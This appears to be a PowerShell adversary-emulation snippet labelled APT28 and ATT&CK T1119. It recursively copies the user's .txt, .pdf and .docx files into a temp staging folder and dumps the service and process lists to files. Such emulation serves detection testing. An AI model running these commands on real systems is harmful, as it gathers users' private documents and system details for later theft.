New-Item -Path $Env:temp\APT28\T1119\ -ItemType Directory | out-null; Get-ChildItem -Recurse $env:userprofile -Include *.txt,*.pdf,*.docx | %{Copy-Item $_.FullName -destination $Env:temp\APT28\T1119\};
Get-Service > $env:temp\APT28\Services.txt;
Get-Process > $env:temp\APT28\Processes.txt